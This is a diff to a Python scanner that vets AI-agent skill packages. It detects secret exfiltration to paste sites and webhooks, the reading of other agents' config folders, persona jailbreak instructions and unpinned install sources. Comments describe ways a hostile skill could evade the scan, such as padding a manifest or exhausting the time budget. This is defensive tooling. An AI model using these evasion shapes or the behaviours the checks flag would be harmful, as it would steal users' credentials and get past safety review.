     raw = re.sub(r",(\s*[}\]])", r"\1", fm[start:end])  # strip trailing commas
     try:
-        obj = json.loads(raw)
+        shallow = _loads_shallow(raw)
     except (ValueError, TypeError):
-        return {}
-    return obj if isinstance(obj, dict) else {}
+        return {}, 0
+    return (shallow.value, shallow.elided) if isinstance(shallow.value, dict) else ({}, 0)
 
 
 def _fm_tag_is_suspicious(fm: str, m) -> bool:
@@ -7036,8 +7422,13 @@ def _frontmatter_name(blob: str) -> str | None:
 # (C-210): a second topic (prose-intent bulk-exfil) now needs the same allowlist, and
 # _content.py already has every dependency these need (_frontmatter_name, _in_fence,
 # _skill_frontmatter_block, _MANIFEST_HEADER_RE) -- moving avoided a circular import.
+# C-730: linear time. `^\s*` under re.M also runs across the blank lines BEFORE the key, so
+# every line start in a run of blank lines rescanned the rest of the run. `^[^\S\n]*` stays on
+# the key's own line: the same keys are found and group 1 is the same; only the match START
+# moves from the first blank line of the run to the key's line, and the one call site reads
+# group 1.
 _FM_HOMEPAGE_RE = re.compile(
-    r"^\s*(?:homepage|repository|repo|url|api|api[-_]url|endpoint|base[-_]url)\s*:\s*"
+    r"^[^\S\n]*(?:homepage|repository|repo|url|api|api[-_]url|endpoint|base[-_]url)\s*:\s*"
     r"[\"']?(https?://[^\s\"'#]+)",
     re.I | re.MULTILINE,
 )
@@ -7132,10 +7523,17 @@ def _skill_own_host(blob: str, fence_ranges: list[tuple[int, int]] | None = None
         if fence_ranges is not None and _in_fence(sm.start(), fence_ranges):
             continue
         try:
-            manifest = json.loads(sm.group("body"))
-        except (json.JSONDecodeError, ValueError):
+            shallow = _loads_shallow(sm.group("body"))
+        except ValueError:
             continue
+        manifest = shallow.value
         if not isinstance(manifest, dict) or "name" not in manifest:
+            continue
+        # C-664: a manifest with a subtree too deep to follow is one we did not fully read,
+        # and a declared own-host is a TRUST grant (callers drop findings aimed at it), so
+        # it grants nothing. Padding a manifest used to be a way to get the grant (it
+        # parsed) or an internal error (it did not).
+        if shallow.elided:
             continue
         if fm_name and str(manifest.get("name", "")).strip().lower() != fm_name.strip().lower():
             continue
@@ -7554,7 +7952,21 @@ def _example_paren_close(
     """Offset of the ')' closing a parenthesis that encloses the marker on its own
     line (plain bracket matching, no vocabulary); None when the marker is not
     parenthesised. Without this, "Setup steps (e.g. on Linux):" would hand its
-    trailing colon to the "e.g." aside instead of to "Setup steps"."""
+    trailing colon to the "e.g." aside instead of to "Setup steps".
+
+    C-651: answered from a per-line bracket table (`_ExampleBlockIndex.paren_close`)
+    instead of re-scanning the line from its start for every marker, which made a
+    line holding N markers cost O(N * line length)."""
+    return _example_index_for(lines).paren_close(m_start, m_end)
+
+
+def _example_paren_close_scan(
+    lines: "_ExampleLines", m_start: int, m_end: int
+) -> int | None:
+    """The plain character scan `_example_paren_close` is defined by. Kept as the
+    answer for the one shape the bracket table cannot model: a marker span that itself
+    contains a bracket (never produced by `_NEGATION_RE`, whose alternatives are
+    brackets-free)."""
     blob = lines.blob
     k = lines.index_of(m_start)
     depth = 0
@@ -7587,26 +7999,20 @@ def _example_clause_end(
     end of a line whose next line opens a new block. An INLINE marker's clause
     additionally ends at a soft-wrapped line whose next line starts a new,
     unpunctuated (capitalised) sentence rather than a continuation."""
-    blob = lines.blob
-    sb = _SENTENCE_BREAK_RE.search(blob, m_end)
-    best = sb.start() if sb else len(blob)
+    idx = _example_index_for(lines)
+    best = idx.sentence_break(m_end)
     if m_start is not None:
         pc = _example_paren_close(lines, m_start, m_end)
         if pc is not None:
             best = min(best, pc)
-    k = lines.index_of(m_end)
-    while k + 1 < len(lines) and lines.starts[k + 1] <= best:
-        nxt_kind = lines.kind(k + 1)[0]
-        cur_kind = lines.kind(k)[0]
-        if nxt_kind in _EXAMPLE_BLOCK_START_KINDS or (nxt_kind == "quote" and cur_kind != "quote"):
-            best = min(best, lines.ends[k])
-            break
-        if inline and nxt_kind == "prose":
-            first = lines.text(k + 1).lstrip()[:1]
-            if first.isupper():
-                best = min(best, lines.ends[k])
-                break
-        k += 1
+    # The original walked line by line from the marker's line until a line opened a new
+    # block, once per marker (O(paragraph) each, C-651). The first line that does so
+    # depends only on where the walk starts and on `inline`, so it is read off a memo.
+    # The walk stopped short of it only when *best* already fell inside an earlier
+    # line, and then `min` with that later line's end leaves *best* as it was.
+    q = idx.clause_stop(lines.index_of(m_end), inline)
+    if q >= 0:
+        best = min(best, lines.ends[q])
     return best
 
 
@@ -7637,41 +8043,258 @@ def _example_item_extent(lines: "_ExampleLines", k: int) -> tuple[int, int]:
     return k, e
 
 
+_EXAMPLE_BREAK_AT_RE = re.compile("(?=" + _SENTENCE_BREAK_RE.pattern + ")", _SENTENCE_BREAK_RE.flags)
+_EXAMPLE_PAREN_RE = re.compile(r"[()]")
+_EXAMPLE_STOP_B = frozenset(("list", "heading", "fence", "table"))
+_EXAMPLE_STOP_A = _EXAMPLE_STOP_B | {"blank"}
+
+
+class _ExampleBlockIndex:
+    """Memoised block extents over one `_ExampleLines` model (C-651). The block walks
+    in `_example_block_of` / `_example_marker_governance` each cost O(paragraph) and
+    ran once per marker, so N example markers in one paragraph cost O(N^2) and one
+    hostile skill could exhaust `check_installed_skills`' whole wall-clock budget.
+    Every table here answers exactly what the original walk answered, filled once per
+    run / item / paragraph: the work stays linear in the blob. Built once per
+    `_ExampleLines` and held in a 1-entry identity cache, like the model itself."""
+
+    __slots__ = ("lines", "_run", "_stop_a", "_stop_b", "_items", "_heads", "_next",
+                 "_tails", "_long", "_breaks", "_stops", "_parens", "_unions")
+
+    def __init__(self, lines: "_ExampleLines") -> None:
+        n = len(lines)
+        self.lines = lines
+        self._run: list = [None] * n
+        self._stop_a: list = [None] * n
+        self._stop_b: list = [None] * n
+        self._items: dict = {}
+        self._heads: dict = {}
+        self._next: dict = {}
+        self._tails: dict = {}
+        self._long: list | None = None
+        self._breaks: list | None = None
+        self._stops: tuple = ([None] * n, [None] * n)  # [not inline, inline]
+        self._parens: dict = {}
+        self._unions: dict = {}
+
+    def sentence_break(self, p: int) -> int:
+        """`_SENTENCE_BREAK_RE.search(blob, p).start()`, or len(blob) when there is no
+        break. Whether the pattern matches at an offset does not depend on where the
+        search began, so every matching offset is listed once (a zero-width lookahead,
+        so overlapping matches are all kept) and each query is a bisect."""
+        if self._breaks is None:
+            blob = self.lines.blob
+            self._breaks = [m.start() for m in _EXAMPLE_BREAK_AT_RE.finditer(blob)]
+        i = bisect.bisect_left(self._breaks, p)
+        return self._breaks[i] if i < len(self._breaks) else len(self.lines.blob)
+
+    def clause_stop(self, k: int, inline: bool) -> int:
+        """First line q >= k with a following line, whose successor opens a new block
+        (or, for an INLINE marker, a new capitalised sentence): the line where
+        `_example_clause_end`'s walk stops. -1 when the walk never stops."""
+        lines = self.lines
+        n = len(lines)
+        arr = self._stops[1 if inline else 0]
+        if arr[k] is None:
+            t = k
+            while True:
+                if arr[t] is not None:
+                    q = arr[t]
+                    break
+                if t + 1 >= n:
+                    q = -1
+                    break
+                nxt_kind = lines.kind(t + 1)[0]
+                if (
+                    nxt_kind in _EXAMPLE_BLOCK_START_KINDS
+                    or (nxt_kind == "quote" and lines.kind(t)[0] != "quote")
+                    or (inline and nxt_kind == "prose" and lines.text(t + 1).lstrip()[:1].isupper())
+                ):
+                    q = t
+                    break
+                t += 1
+            for u in range(k, t + 1):
+                arr[u] = q
+        return arr[k]
+
+    def paren_close(self, m_start: int, m_end: int) -> int | None:
+        """The bracket table of the marker's line, built once: where each bracket is, the
+        depth after it (a ')' at depth 0 is ignored, as in the plain scan), the last
+        depth-0 bracket so far, and which ')' closes which '('."""
+        lines = self.lines
+        k = lines.index_of(m_start)
+        tab = self._parens.get(k)
+        if tab is None:
+            blob = lines.blob
+            pos: list[int] = []
+            depth_after: list[int] = []
+            last_zero: list[int] = []
+            closes: dict[int, int] = {}
+            stack: list[int] = []
+            lz = -1
+            for m in _EXAMPLE_PAREN_RE.finditer(blob, lines.starts[k], lines.ends[k]):
+                i = len(pos)
+                p = m.start()
+                pos.append(p)
+                if blob[p] == "(":
+                    stack.append(i)
+                elif stack:
+                    closes[stack.pop()] = p
+                depth_after.append(len(stack))
+                if not stack:
+                    lz = i
+                last_zero.append(lz)
+            tab = self._parens[k] = (pos, depth_after, last_zero, closes)
+        pos, depth_after, last_zero, closes = tab
+        cut = bisect.bisect_left(pos, m_start)  # brackets before the marker
+        if cut == 0 or depth_after[cut - 1] == 0:
+            return None
+        if cut < len(pos) and pos[cut] < m_end:
+            return _example_paren_close_scan(lines, m_start, m_end)
+        # the marker is inside `depth_after[cut-1]` open brackets; the scan from its end
+        # reaches depth 0 exactly where the outermost of them (the first bracket after
+        # the last depth-0 one) is closed
+        return closes.get(last_zero[cut - 1] + 1)
+
+    def run(self, i: int) -> tuple[int, int]:
+        """[start, end) of the maximal run of consecutive lines sharing line *i*'s kind."""
+        r = self._run[i]
+        if r is None:
+            lines = self.lines
+            kd = lines.kind(i)[0]
+            s, e = i, i + 1
+            while s > 0 and lines.kind(s - 1)[0] == kd:
+                s -= 1
+            while e < len(lines) and lines.kind(e)[0] == kd:
+                e += 1
+            r = (s, e)
+            for t in range(s, e):
+                self._run[t] = r
+        return r
+
+    def stopper(self, k: int) -> int:
+        """The line where `_example_block_of`'s backward scan from *k* stops, or -1.
+        A blank stops it, except that a blank above an indented *k* is walked through."""
+        lines = self.lines
+        if lines.kind(k)[0] == "blank":
+            return k
+        arr, stops = (
+            (self._stop_b, _EXAMPLE_STOP_B) if lines.indent(k) > 0
+            else (self._stop_a, _EXAMPLE_STOP_A)
+        )
+        if arr[k] is None:
+            t = k
+            while t >= 0 and arr[t] is None and lines.kind(t)[0] not in stops:
+                t -= 1
+            if t < 0:
+                res, lo = -1, 0
+            elif arr[t] is not None:
+                res, lo = arr[t], t + 1
+            else:
+                res, lo = t, t
+            for u in range(lo, k + 1):
+                arr[u] = res
+        return arr[k]
+
+    def item_extent(self, j: int) -> tuple[int, int]:
+        r = self._items.get(j)
+        if r is None:
+            r = self._items[j] = _example_item_extent(self.lines, j)
+        return r
+
+    def heading_boundary(self, bs: int) -> int:
+        """Offset of the next heading line after line *bs* (or the end of the blob)."""
+        r = self._heads.get(bs)
+        if r is None:
+            lines = self.lines
+            k = bs + 1
+            while k < len(lines) and lines.kind(k)[0] != "heading":
+                k += 1
+            r = self._heads[bs] = lines.starts[k] if k < len(lines) else len(lines.blob)
+        return r
+
+    def next_regions(self, be: int) -> tuple[list[tuple[int, int]], list[tuple[int, int]]]:
+        r = self._next.get(be)
+        if r is None:
+            r = self._next[be] = _example_next_block_regions(self.lines, be)
+        return r
+
+    def in_region(self, be: int, which: int, pos: int) -> bool:
+        """`_example_pos_in_spans(next_regions(be)[which], pos)` (which: 0 strong, 1
+        ambiguous) against the union of the spans, merged and sorted once, not an
+        `any` over every span per marker."""
+        u = self._unions.get((be, which))
+        if u is None:
+            starts: list[int] = []
+            ends: list[int] = []
+            for a, b in sorted(sp for sp in self.next_regions(be)[which] if sp[0] < sp[1]):
+                if ends and a <= ends[-1]:
+                    ends[-1] = max(ends[-1], b)
+                else:
+                    starts.append(a)
+                    ends.append(b)
+            u = self._unions[(be, which)] = (starts, ends)
+        i = bisect.bisect_right(u[0], pos) - 1
+        return i >= 0 and pos < u[1][i]
+
+    def rstrip_end(self, pk: int) -> int:
+        """Offset just past the last non-whitespace character at or before the end of
+        line *pk* - `len(blob[:ends[pk]].rstrip())` without the O(blob) copy."""
+        r = self._tails.get(pk)
+        if r is None:
+            blob = self.lines.blob
+            r = self.lines.ends[pk]
+            while r > 0 and blob[r - 1].isspace():
+                r -= 1
+            self._tails[pk] = r
+        return r
+
+    def para_end(self, km: int, be: int) -> int:
+        """Last line of the marker's own paragraph inside a "para" block: the block's
+        last line, unless an absurdly indented (> 10**6 columns) line cuts it short."""
+        if self._long is None:
+            lines = self.lines
+            self._long = (
+                [i for i in range(len(lines)) if lines.ends[i] - lines.starts[i] > 10**6]
+                if len(lines.blob) > 10**6 else []
+            )
+        for t in self._long[bisect.bisect_right(self._long, km):]:
+            if t >= be:
+                break
+            if self.lines.indent(t) > 10**6:
+                return t - 1
+        return be - 1
+
+
+_EXAMPLE_INDEX_CACHE: list = [None, None]  # [lines, _ExampleBlockIndex(lines)]
+
+
+def _example_index_for(lines: "_ExampleLines") -> "_ExampleBlockIndex":
+    if _EXAMPLE_INDEX_CACHE[0] is not lines:
+        _EXAMPLE_INDEX_CACHE[0] = lines
+        _EXAMPLE_INDEX_CACHE[1] = _ExampleBlockIndex(lines)
+    return _EXAMPLE_INDEX_CACHE[1]
+
+
 def _example_block_of(lines: "_ExampleLines", k: int) -> tuple[str, int, int]:
     """(kind, first_line, end_line_exclusive) of the block containing line *k*: a
     list item (with its continuations/nested content), a heading line, a quote or
     table run, or a paragraph."""
     n = len(lines)
-    j = k
-    while j >= 0:
-        kj = lines.kind(j)
-        if kj[0] == "list":
-            s, e = _example_item_extent(lines, j)
-            if s <= k < e:
-                return ("item", s, e)
-            break
-        if kj[0] == "blank" and not (j < k and lines.indent(k) > 0):
-            break
-        if kj[0] in ("heading", "fence", "table"):
-            break
-        j -= 1
+    idx = _example_index_for(lines)
+    j = idx.stopper(k)
+    if j >= 0 and lines.kind(j)[0] == "list":
+        s, e = idx.item_extent(j)
+        if s <= k < e:
+            return ("item", s, e)
     kd = lines.kind(k)[0]
     if kd == "heading":
         return ("heading", k, k + 1)
     if kd in ("table", "quote"):
-        s = k
-        while s - 1 >= 0 and lines.kind(s - 1)[0] == kd:
-            s -= 1
-        e = k + 1
-        while e < n and lines.kind(e)[0] == kd:
-            e += 1
+        s, e = idx.run(k)
         return (kd, s, e)
-    s = k
-    while s - 1 >= 0 and lines.kind(s - 1)[0] == "prose":
-        s -= 1
-    e = k + 1
-    while e < n and lines.kind(e)[0] == "prose":
-        e += 1
+    s = idx.run(k - 1)[0] if k >= 1 and lines.kind(k - 1)[0] == "prose" else k
+    e = idx.run(k + 1)[1] if k + 1 < n and lines.kind(k + 1)[0] == "prose" else k + 1
     return ("para", s, e)
 
 
@@ -7769,48 +8392,47 @@ def _example_marker_governance(
     clause_end = _example_clause_end(lines, m_end, m_start, inline)
     if pos < clause_end:
         return _EXAMPLE_STRONG
+    idx = _example_index_for(lines)
     km = lines.index_of(m_start)
     bkind, bs, be = _example_block_of(lines, km)
     if bkind == "heading":
         if inline:
             return _EXAMPLE_LIVE  # an "e.g." in a heading annotates its own phrase only
-        k = bs + 1
-        while k < len(lines) and lines.kind(k)[0] != "heading":
-            k += 1
-        boundary = lines.starts[k] if k < len(lines) else len(blob)
-        return _EXAMPLE_AMBIGUOUS if pos < boundary else _EXAMPLE_LIVE
+        return _EXAMPLE_AMBIGUOUS if pos < idx.heading_boundary(bs) else _EXAMPLE_LIVE
     b_lo, b_hi = _example_span(lines, bs, be)
     # The marker's own paragraph: from its line to the first line that opens a new
     # block. For a list item this is its FIRST paragraph only - deeper-nested
-    # content is not part of the intro a trailing colon could be labelling.
+    # content is not part of the intro a trailing colon could be labelling. A table
+    # or quote run opens no paragraph (the next line of the run is itself a block
+    # start), so only an item and a paragraph have anything to extend over (C-651:
+    # read off the memoised run instead of re-walking it once per marker).
     pk = km
-    while (
-        pk + 1 < be
-        and lines.kind(pk + 1)[0] not in _EXAMPLE_BLOCK_START_KINDS + ("quote",)
-        and lines.indent(pk + 1) <= (lines.indent(bs) if bkind == "item" else 10**6)
-    ):
-        pk += 1
     if bkind == "item":
-        pk = km
-        while pk + 1 < be and lines.kind(pk + 1)[0] == "prose":
-            pk += 1
-    block_text = blob[m_start:lines.ends[pk]].rstrip()
-    colon_at = m_start + len(block_text) - 1
-    colon_intro = block_text.endswith(":") and colon_at >= m_end and clause_end >= colon_at
+        if km + 1 < be and lines.kind(km + 1)[0] == "prose":
+            pk = min(idx.run(km + 1)[1], be) - 1
+    elif bkind == "para":
+        pk = idx.para_end(km, be)
+    # `blob[m_start:ends[pk]].rstrip()` without copying the paragraph per marker: its
+    # end is `text_end` whenever that lies past *m_start*, and an empty/blank slice can
+    # never satisfy `text_end > m_start` below
+    text_end = idx.rstrip_end(pk)
+    colon_at = text_end - 1
+    colon_intro = (
+        text_end > m_start and blob[colon_at] == ":" and colon_at >= m_end and clause_end >= colon_at
+    )
     if b_lo <= pos < b_hi:
         if bkind == "item" and colon_intro:
             return _EXAMPLE_STRONG  # the item's own nested content under "...:"
         return _EXAMPLE_LIVE if inline else _EXAMPLE_AMBIGUOUS
     if bkind == "item":
         return _EXAMPLE_LIVE  # an item never governs a sibling or anything after its list
-    strong, ambig = _example_next_block_regions(lines, be)
     if colon_intro:
-        if _example_pos_in_spans(strong, pos):
+        if idx.in_region(be, 0, pos):
             return _EXAMPLE_STRONG
-        if _example_pos_in_spans(ambig, pos):
+        if idx.in_region(be, 1, pos):
             return _EXAMPLE_AMBIGUOUS
         return _EXAMPLE_LIVE
-    if not inline and (_example_pos_in_spans(strong, pos) or _example_pos_in_spans(ambig, pos)):
+    if not inline and (idx.in_region(be, 0, pos) or idx.in_region(be, 1, pos)):
         return _EXAMPLE_AMBIGUOUS
     return _EXAMPLE_LIVE
 
@@ -7831,6 +8453,11 @@ def _example_governance(
     if _in_fence(pos, fence_ranges):
         return _example_fence_governance(blob, pos, fence_ranges, fence_needs_negation)
     window_start = max(0, pos - _NEGATION_WINDOW)
+    if _straddling_donot_marker(blob, window_start, pos) is not None:
+        # C-614: "Do not <verb>" whose verb starts the match. The marker's clause
+        # runs to the end of the sentence, so *pos* is inside it: STRONG (the same
+        # answer `_example_marker_governance` gives when pos < clause_end).
+        return _EXAMPLE_STRONG
     lines: _ExampleLines | None = None
     best = _EXAMPLE_LIVE
     for m in _NEGATION_RE.finditer(blob[window_start:pos]):
@@ -7977,6 +8604,11 @@ def _example_fence_governance(
     fence_start, fence_end = fence
     window_start = max(0, pos - _NEGATION_WINDOW)
     candidates: list[tuple[int, int, bool]] = []
+    sd = _straddling_donot_marker(blob, window_start, pos)  # C-614: verb starts the match
+    if sd is not None:
+        if sd.start() >= fence_start:
+            return _EXAMPLE_STRONG  # self-annotated inside the fence, same rule as below
+        candidates.append((sd.start(), sd.end(), False))
     for m in _NEGATION_RE.finditer(blob[window_start:pos]):
         a = window_start + m.start()
         if a >= fence_start:
@@ -8092,7 +8724,10 @@ def _nearest_heading(blob: str, pos: int, heading_matches=None) -> str | None:
 def _negation_context(blob: str, pos: int) -> bool:
     """Return True when the _NEGATION_WINDOW chars before *pos* contain a negation marker."""
     window_start = max(0, pos - _NEGATION_WINDOW)
-    return bool(_NEGATION_RE.search(blob[window_start:pos]))
+    return (
+        bool(_NEGATION_RE.search(blob[window_start:pos]))
+        or _straddling_donot_marker(blob, window_start, pos) is not None  # C-614
+    )
 
 
 def _negation_governs_trigger(
@@ -8442,7 +9077,7 @@ def _symlink_scan_roots(
 
     def _add(p: Path, gate: Path) -> None:
         try:
-            is_link = p.is_symlink()
+            is_link = pathprobe.is_symlink(p)
         except OSError as exc:
             _note(gate, exc)  # `gate` is the parent that would not let us stat `p`
             return
@@ -8450,21 +9085,21 @@ def _symlink_scan_roots(
             _add_link(p)
             return
         try:
-            if p.is_dir() and str(p) not in seen:
+            if pathprobe.is_dir(p) and str(p) not in seen:
                 seen.add(str(p))
                 roots.append(p)
         except OSError as exc:
             _note(gate, exc)
 
     try:
-        if (home / "SKILL.md").is_file():  # vet: the vetted dir itself
+        if pathprobe.is_file(home / "SKILL.md"):  # vet: the vetted dir itself
             _add(home, home)
     except OSError as exc:
         _note(home, exc)
     for rel in SKILL_DIRS:  # full audit: each installed skill dir
         base = home / rel
         try:
-            is_link = base.is_symlink()
+            is_link = pathprobe.is_symlink(base)
         except OSError as exc:
             _note(base.parent, exc)
             continue
@@ -8472,7 +9107,7 @@ def _symlink_scan_roots(
             _add_link(base)
             continue
         try:
-            if not base.is_dir():
+            if not pathprobe.is_dir(base):
                 continue
         except OSError as exc:
             _note(base.parent, exc)
@@ -8514,7 +9149,7 @@ def _b87_skill_bases(home: Path) -> list[Path]:
 
     bases = [home / rel for rel in SKILL_DIRS]
     try:
-        vet = (home / "SKILL.md").is_file()
+        vet = pathprobe.is_file(home / "SKILL.md")
     except OSError:
         vet = True  # cannot tell -> treat the whole tree as skill content (graded)
     if vet:
@@ -8816,10 +9451,38 @@ _OLLAMA_PULL_RE = re.compile(
     r'|["\']ollama["\']\s*,\s*["\']pull["\']\s*,\s*["\']([^"\']+)["\']',
     re.I,
 )
+# The model-file URL shape, kept as the executable definition of what `_model_file_urls`
+# yields. C-730: not run over file text any more - in "http://http://http://..." every
+# scheme began an attempt that scanned the whole run of URL characters.
 _MODEL_FILE_URL_RE = re.compile(
     r'https?://[^\s"\'<>)\]]+\.(?:gguf|safetensors|onnx)\b',
     re.I,
 )
+_MODEL_URL_RUN_RE = re.compile(r'[^\s"\'<>)\]]+')
+_MODEL_URL_SCHEME_RE = re.compile(r"https?://", re.I)
+_MODEL_URL_EXT_RE = re.compile(r"\.(?:gguf|safetensors|onnx)\b", re.I)
+
+
+def _model_file_urls(text: str):
+    """Yield a match (``start()``, ``end()``, ``span()``, ``group(0)``) for each one
+    `_MODEL_FILE_URL_RE.finditer(text)` would produce (C-730).
+
+    A match lies inside one maximal run of URL characters: the regex starts at the run's
+    FIRST scheme and, being greedy, ends at the run's LAST model-file extension, with at
+    least one character between them - so a run holds at most one match, and it is found
+    with one search for each instead of one scan of the run per scheme.
+    """
+    for run in _MODEL_URL_RUN_RE.finditer(text):
+        lo, hi = run.span()
+        last = None
+        for ext in _MODEL_URL_EXT_RE.finditer(text, lo, hi):
+            last = ext
+        if last is None:
+            continue
+        scheme = _MODEL_URL_SCHEME_RE.search(text, lo, hi)
+        if scheme is None or scheme.end() >= last.start():
+            continue
+        yield _ScanMatch(text, scheme.start(), last.end())
 # A revision/commit/digest pin near the call site - checked in a window around the
 # match, not just inside the captured argument, since revision= is usually a sibling
 # kwarg on the same call rather than part of the repo-id string.
@@ -8856,7 +9519,7 @@ def _model_provenance_hits(
         window = blob[max(0, start - _MODEL_PIN_WINDOW) : end + _MODEL_PIN_WINDOW]
         return bool(_MODEL_REVISION_PIN_RE.search(window))
 
-    for m in _MODEL_FILE_URL_RE.finditer(blob):
+    for m in _model_file_urls(blob):
         if m.span() in seen_spans:
             continue
         seen_spans.add(m.span())
@@ -9263,7 +9926,9 @@ def check_agent_snooping(ctx: Context) -> Finding:
         fix = (
             "Remove or sandbox any skill that reads foreign-agent config files "
             "(~/.claude/, ~/.codex/, ~/.gemini/, ~/.openclaw/). "
-            "A legitimate skill only accesses its own files."
+            "A legitimate skill only accesses its own files. The path named may be this "
+            "host's own OpenClaw configuration rather than a sibling agent's: a skill has "
+            "no business reading it and sending it out either way."
         )
         if slug_ambiguous_skills:
             # B-535, accepted §2.5 residual (routed per (d) for a FAIL-band signal,
@@ -9816,7 +10481,10 @@ def check_overt_secret_exfil(ctx: Context) -> Finding:
     PASS - no such directive, or the flagged known-bad host IS the skill's own declared
            homepage/repo/api host (first-party allowlist, B160/B-132 precedent) - never
            escalated, stays WARN in that case (see below).
-    UNKNOWN - nothing to inspect.
+    UNKNOWN - nothing to inspect, OR a bundled Python script could not be parsed (so
+           its docstrings/comments were not scanned) and no other evidence was found
+           (C-619). A FAIL/WARN from readable text is unchanged; the unread script is
+           listed as a ``coverage:`` evidence note either way.
 
     Escalation is corroborator-gated, not host-list-alone: a legitimate cloud / DevOps
     skill may transmit its OWN credential to its OWN backend ("send the api_key to the
@@ -9877,6 +10545,10 @@ def check_overt_secret_exfil(ctx: Context) -> Finding:
             )
             warn_ev.append(tag)
 
+    # C-619: a bundled .py that does not parse cannot have its docstrings/comments
+    # read. That must neither erase the hits above nor read as a clean PASS.
+    cov = _script_prose_unread_notes(ctx)
+
     if fail_ev:
         ev_summary = "; ".join(fail_ev[:4])
         extra = f" (+{len(fail_ev) - 4} more)" if len(fail_ev) > 4 else ""
@@ -9890,7 +10562,7 @@ def check_overt_secret_exfil(ctx: Context) -> Finding:
             "credentials to a paste site, webhook relay, or tunneling service. If a "
             "skill must authenticate, send only to its own documented first-party "
             "endpoint and never route the raw secret value out.",
-            fail_ev,
+            fail_ev + cov,
         )
 
     if warn_ev:
@@ -9905,7 +10577,21 @@ def check_overt_secret_exfil(ctx: Context) -> Finding:
             "Never transmit secrets, tokens, or credentials to external or operator-"
             "controlled destinations. If a skill must authenticate, send only to a "
             "documented first-party endpoint and never route the raw secret value out.",
-            warn_ev,
+            warn_ev + cov,
+        )
+
+    if cov:
+        return _finding(
+            "B156",
+            UNKNOWN,
+            "No overt secret-exfil directive was found in the text that could be read, "
+            "but a bundled Python script could not be parsed, so its docstrings and "
+            "comments were not scanned.",
+            "Review the docstrings and comments of the unparsed script(s) by hand before "
+            "trusting the skill. A parse failure can mean a syntax error, a deliberately "
+            "malformed file, or syntax newer than the Python running this scan.",
+            cov,
+            engine_degraded=True,
         )
 
     return _finding(
@@ -10694,11 +11380,14 @@ def check_dormant_capability(ctx: Context) -> Finding:
     js = getattr(ctx, "installed_skill_js", {})
     warns: list[str] = []
     inspected = 0
+    too_deep: list[str] = []  # C-664: metadata with a subtree too deep to follow
     for name, blob in skills.items():
         fm = _skill_frontmatter_block(blob)
         if fm is None:
             continue
         inspected += 1
+        if _fm_metadata_obj_shallow(fm)[1]:
+            too_deep.append(name)
         if not _skill_is_unreachable(fm):
             continue
         ships_code = bool(py.get(name) or sh.get(name) or js.get(name))
@@ -10726,6 +11415,21 @@ def check_dormant_capability(ctx: Context) -> Finding:
             "code \u2014 this is the shape of a payload staged for later activation. Remove the "
             "unused code, or make the skill reachable and review what the code does.",
             warns,
+        )
+    if too_deep:
+        # C-664: the reachability flags sit near the top and were read in full, but the
+        # metadata holds a subtree nested deeper than this reader follows - part of the
+        # document went unread, so no clean PASS.
+        return _custom(
+            "B89",
+            MEDIUM,
+            UNKNOWN,
+            f"Assessed {inspected} skill(s), but the metadata of {len(too_deep)} skill(s) is "
+            "nested too deeply to read in full: " + ", ".join(too_deep[:6]) + ".",
+            "Flatten the SKILL.md metadata block so the reachability flags can be confirmed "
+            "by a full read.",
+            too_deep,
+            engine_degraded=True,
         )
     return _custom(
         "B89",
@@ -11142,7 +11846,7 @@ def check_image_attr_injection(ctx: Context) -> Finding:
     def _scan(blob: str, source: str) -> None:
         norm = normalize_for_scan(blob)
         fr = _fence_ranges(norm)
-        for m in _B59_HTML_TAG_RE.finditer(norm):
+        for m in _b59_html_tags(norm):
             if _is_code_example(norm, m.start(), fr, fence_needs_negation=True):
                 continue
             tag = m.group(0)
@@ -11248,11 +11952,15 @@ def check_install_directive_supply_chain(ctx: Context) -> Finding:
         )
     fails: list[str] = []
     inspected = 0
+    too_deep: list[str] = []  # C-664: skills whose metadata had a subtree too deep to follow
     for name, blob in skills.items():
         fm = _skill_frontmatter_block(blob)
         if fm is None:
             continue
-        install = dig(_fm_metadata_obj_multiline(fm), "openclaw.install")
+        meta, elided = _fm_metadata_obj_multiline_shallow(fm)
+        if elided:
+            too_deep.append(name)
+        install = dig(meta, "openclaw.install")
         if not install:
             continue
         inspected += 1
@@ -11272,6 +11980,19 @@ def check_install_directive_supply_chain(ctx: Context) -> Finding:
             ".onion host, is an unverified supply-chain source that can be silently swapped. "
             "Pin the source to an HTTPS URL on a named host, or remove the directive.",
             fails,
+        )
+    if too_deep:
+        # C-664: the install[] list was read in full (it sits near the top), but the
+        # metadata holds a subtree nested deeper than this reader follows - an unread
+        # part of the document, so no clean PASS.
+        return _custom(
+            "B103", HIGH, UNKNOWN,
+            f"Inspected {inspected} skill(s) with install directives, but the metadata of "
+            f"{len(too_deep)} skill(s) is nested too deeply to read in full: "
+            + ", ".join(too_deep[:6]) + ".",
+            "Flatten the SKILL.md metadata block, or review its install[] directives by hand.",
+            too_deep,
+            engine_degraded=True,
         )
     return _custom(
         "B103", HIGH, PASS,
@@ -12011,7 +12732,10 @@ def check_persona_jailbreak(ctx: Context) -> Finding:
             `_defensive_context`/`_pos_in_source_code_section` (B-305)
             correctly exempts the surrounding CODE.
     PASS  - no persona-jailbreak pattern.
-    UNKNOWN - nothing to inspect.
+    UNKNOWN - nothing to inspect, OR a bundled Python script could not be parsed (so
+            its docstrings/comments were not scanned) and no other evidence was found
+            (C-619). A hit in readable text is still a WARN; the unread script is
+            listed as a ``coverage:`` evidence note either way.
     """
     if not ctx.bootstrap and not ctx.installed_skills:
         return _finding(
@@ -12067,6 +12791,10 @@ def check_persona_jailbreak(ctx: Context) -> Finding:
                 f"authority-override pattern: {hit}"
             )
 
+    # C-619: a bundled .py that does not parse cannot have its docstrings/comments
+    # read. That must neither erase the hits above nor read as a clean PASS.
+    cov = _script_prose_unread_notes(ctx)
+
     if evidence:
         return _finding(
             "B66",
@@ -12075,7 +12803,21 @@ def check_persona_jailbreak(ctx: Context) -> Finding:
             "Remove role-switch instructions that attempt to reset constraints "
             "or inject a low-trust persona. Enforce fixed policy boundaries: "
             "system constraints should remain the top authority.",
-            evidence,
+            evidence + cov,
+        )
+
+    if cov:
+        return _finding(
+            "B66",
+            UNKNOWN,
+            "No persona / role jailbreak indicator was found in the text that could be "
+            "read, but a bundled Python script could not be parsed, so its docstrings "
+            "and comments were not scanned.",
+            "Review the docstrings and comments of the unparsed script(s) by hand before "
+            "trusting the skill. A parse failure can mean a syntax error, a deliberately "
+            "malformed file, or syntax newer than the Python running this scan.",
+            cov,
+            engine_degraded=True,
         )
 
     return _finding(
@@ -16781,7 +17523,7 @@ def check_symlink_escape(ctx: Context) -> Finding:
             # `sub/.envrc -> ../.envrc`) adds no new reach - the file is already readable
             # without the link. Not an escape; surface as WARN for a human look, never FAIL.
